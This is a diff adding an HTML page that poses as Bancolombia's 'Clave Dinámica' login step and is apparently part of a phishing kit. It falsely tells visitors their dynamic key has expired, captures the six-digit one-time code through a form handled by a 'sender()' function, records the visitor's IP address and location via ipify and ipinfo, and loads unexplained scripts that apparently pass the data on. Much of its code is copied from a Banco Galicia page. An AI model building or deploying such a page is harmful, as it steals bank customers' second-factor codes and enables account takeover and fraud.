@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="es-ar">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">
+      <title>Bancolombia | Clave Dinámica</title>
+      <link rel="shortcut icon" href="img/favicon.ico">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+      <link type="text/css" href="css/bootstrap.min.css" rel="stylesheet">
+      <link type="text/css" href="css/default.min2.css" rel="stylesheet">
+      <link type="text/css" href="css/keyboard.css" rel="stylesheet">
+      <link type="text/css" href="css/simple-keyboard.css" rel="stylesheet">
+      <script src="js/FrontFunctions.min.js" type="text/javascript"></script>
+      <script src="js/sharedout"></script>
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    
+})
+      </script>
+
+      
+      <link type="text/css" href="css/customcarousel.min.css" rel="stylesheet">
+      
+      <style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style>
+   </head>
+   <body>
+      
+      <div class="container-fluid ">
+         <div class="row full-h">
+            <div class="left-column">
+               <div class="logo_login" role="banner" data-automation-id="galicia-banner">
+                  
+                  <p id="gfg"  hidden="">
+                  <p id="address"  hidden="">
+               </div>
+               <div class="login">
+                  <div class="content-login" role="main">
+                     <form action="" method="post" autocomplete="off" onsubmit=" return sender()">
+                        <input name="__RequestVerificationToken" type="hidden" value="zgXEd3JP-HmevsHari1rFVs50vnAN9d9t_nCHj7kcBZm8Asry7RGqIwZdKJOjhByCJ3h8OjouentNLqgbN6zZF_gRp59jJ76d14C5a3iDQo1" data-hj-masked="">
+                        <div class="login-form">
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <h1 onclick="enableDebug();" class="login-title " data-hj-masked="">Ingresa la Clave Dinámica</h1>
+                                 <p ><FONT style="color: red;">Clave dinámica expirada,</FONT> ingresa la clave dinámica de 6 dígitos de la App Bancolombia.</p>
+                              </div>
+                              <input data-hj-masked="" type="hidden" value="" name="EncriptedPassword" id="EncriptedPassword">
+                              
+                              <div class="inputWrapper password">
+                                 <div class="inputArea">
+                                    <div class="contentInput">
+                                       <input data-hj-masked="" type="text" name="DocumentNumber" id="DocumentNumber"  maxlength="6" minlength="6" value="" required=""  autocomplete="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" class="form-control keyboard" >
+
+                                    </div>
+                                    <label for="UserName" class="inputLabel" data-hj-masked="">Clave Dinámica</label>
+                                    <div class="capsLock" data-hj-masked=""></div>
+                                   
+                                    <div class="inputUnderline" data-hj-masked=""></div>
+                                    <div class="labelMsg" data-hj-masked="">Bloqueo de mayúsculas activado</div>
+                                 </div>
+                                 <br>
+                              <br>
+                              </div>
+
+                            
+
+                              <div class="col-xs-12">
+                                 <button class="btn btn-md btn-full-width" style="background-color: #FDDA24;color: black;" type="submit"  >
+                                 vALIDar
+                                 </button>
+                              </div>
+                              
+                               <p>¿Cómo obtener la clave dinámica?</p>
+                             <p>1. Ingresa a la App Bancolombia</p>
+                             <p>2. Presiona el botón  "Clave Dinámica" en la pantalla de ingreso</p>
+                           </div>
+                        </div>
+                       
+                     </form>
+                  </div>
+               </div>
+               <div class="terms" role="contentinfo">
+                  <p data-hj-masked="">Operar con Online Banking implica aceptar los <a href="javascript:void(0)" onclick="javascript:window.open(&#39;/terminosycondiciones&#39;, &#39;_blank&#39;);return false;" data-hj-masked="">términos y condiciones</a> en los que se ofrece el servicio.</p>
+                  <p data-hj-masked=""><a href="https://www.bancolombia.com/personas" data-hj-masked="">Información sobre seguridad</a></p>
+               </div>
+              
+               <div class="modal fade" id="popupErrorCredenciales" role="dialog" data-backdrop="static" data-keyboard="false">
+                  <div class="modal-dialog">
+                     <!-- Modal content-->
+                     <div class="modal-content">
+                        <div class="modal-header">
+                           <p class="modal-title description" data-hj-masked="">Los datos que ingresaste tienen algún error</p>
+                        </div>
+                        <div class="modal-body">
+                           <p data-hj-masked="">Por favor, revisalos antes de volver a intentarlo, ya que tu usuario y clave pueden bloquearse.</p>
+                           <p data-hj-masked="">
+                              25072022164421
+                           </p>
+                        </div>
+                        <div class="modal-footer">
+                           <button type="button" class="btn btn-caps" data-dismiss="modal">ACEPTAR</button>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               
+            </div>
+            <div class="side-info content img art art-6" role="complementary" data-automation-id="out-banner">
+               <div class="bullet">
+                  <h2 data-hj-masked="">Bienvenido a<br> Online Banking</h2>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="mainModalContainer" data-hj-masked=""></div>
+      <script type="text/javascript">
+        $(document).ready(function () {
+            var xhrPool = [];
+            $(document).ajaxSend(function (e, jqXHR, options) {
+                xhrPool.push(jqXHR);
+            });
+            $(document).ajaxComplete(function (e, jqXHR, options) {
+                xhrPool = $.grep(xhrPool, function (x) { return x != jqXHR });
+                $.HBAnalytics.addHotjarAttribute();
+                RenewTimeOutClientSide();
+            });
+            var abort = function () {
+                $.each(xhrPool, function (idx, jqXHR) {
+                    jqXHR.abort();
+                });
+            };
+
+            var oldbeforeunload = window.onbeforeunload;
+            window.onbeforeunload = function () {
+                var r = oldbeforeunload ? oldbeforeunload() : undefined;
+                if (r == undefined) {
+                    // only cancel requests if there is no prompt to stay on the page
+                    // if there is a prompt, it will likely give the requests enough time to finish
+                    abort();
+                }
+                return r;
+            }
+            inputsEfect();
+            $.HBAnalytics.triggerHotjarReady();
+            sessionStorage.removeItem("signOut");
+            $.HBAnalytics.executeGtmTags($.HBAnalytics.afterReadyEvents);
+
+            try { if(window.location.pathname == '/inversiones/inicio'){
+var element = document.createElement("div");
+element.innerHTML ="<div class='col-xs-12 alert-box push-top-20 push-top-xs-10 push-bottom-5 push-bottom-xs-10 no-padding-left'><div class='box-user alert-border alert-border-yellow cursor-d no-shadow no-margin-bottom'><i class='icon-left icon-info-yellow pull-left'></i><div class='box-content no-padding-right push-left-20'><p class='alert-title'>Ahora no es posible comprar CEDEARs</p><span class='no-margin-bottom'>Estamos haciendo los cambios que pide el BCRA en su Comunicación A 7552. </p><span class='no-margin-bottom'>En los próximos días podrás volver a comprar.</span></div></div></div></div>";
+var overview = document.querySelector(".perfil-overview");
+overview.insertBefore(element,overview.firstElementChild);}
+
+
+
+
+
+//terminos y condiciones dolar mep
+if(window.location.pathname == '/inversiones/v2/comprar-vender-dolar-mep-preconfirmacion'){
+$('label[for=AceptaTerminosYCondicionesMEP]').html('Solicito a Banco Galicia la orden de compra en pesos de los bonos GD30 a precio de mercado, según el monto indicado. Solicito a Banco Galicia la orden de venta en dólares de los bonos GD30 que compró mediante la órden anterior, a precio de mercado. Declaro bajo juramento que he leído y acepto los <a href="javascript:void(0)"><span class="color-default"> Términos y Condiciones</span> de esta operación.</a>');
+var tyc  = document.querySelector("#form > div.check-desc.push-top-30 > div > label > a")
+$(tyc).attr("onclick", "event.stopPropagation(); javascript:window.open('/inversiones/v2/TyC_DolarMEP', '_blank'); return false;")
+}
+
+//Transferencias
+if (window.location.pathname == '/transferencias/inicio')
+{
+$(document).ajaxComplete(function( event, xhr, settings ) {
+if (settings.url.indexOf('/transferencias/SideHistorialTransferencias') > -1 && $("#mailDestinoComprobante").val() != '')
+document.querySelector("#btn_enviarComprobante").disabled = false;
+});
+}
+
+if (window.location.pathname == '/transferencias/confirmacion')
+{
+$(document).ajaxComplete(function( event, xhr, settings ) {
+if (settings.url.indexOf('/EnvioDinero/SideTerceros') > -1 && $("#mailDestinoComprobante").val() !== '')
+document.querySelector("#btn_enviarComprobante").disabled = false;
+});
+}
+
+if (window.location.pathname == '/transferencias/confirmacion-haberes')
+{
+$(document).ajaxComplete(function( event, xhr, settings ) {
+if (settings.url.indexOf('/EnvioDinero/SideHaberes') > -1 && $("#mailDestinoComprobante").val() !== '')
+document.querySelector("#btn_enviarComprobante").disabled = false;
+});
+}
+
+if(window.location.pathname == '/tarjetas/upgrade'){
+    window.location.href = "/navigation/menulink/31";  
+}
+
+if(window.location.href.indexOf("transferencias") > -1 )
+{
+   
+   
+   document.querySelector('#HelpIcon').onclick = function() {
+      if(document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)") != null){
+   document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)").remove()
+   document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)").innerText = ' '
+      }
+
+   if(document.querySelector("#HelpContentContainer > div > div > ul") != null){
+      
+      if(document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)").textContent.includes('mensual')) {
+         document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)").remove()
+      }
+      
+      if(document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)").textContent.includes('mensual')) {
+      document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)").remove()
+      }
+      
+      if(document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)").textContent.includes('mensual'))
+      {
+         document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)").remove()
+      }
+   }
+ }
+} } catch(e) { }
+
+
+            if (sessionStorage.getItem('LinkExterno')) {
+                //MANEJO DE ENLACES CUANDO SE ACCEDE DESDE UN PORTAL EXTERNO
+                $('.logo').removeAttr('href');
+                $('#btnCerrar, .page-header .icon-close, #cancellationFlowButton').attr('href', 'javascript:window.close();');
+                $('.error-view #Button1, .exito-view #Button1').attr('onclick', 'javascript:window.close();');
+            }
+        });
+
+    </script>
+      <script src="js/sax3.js"></script>
+   </body>
+</html>
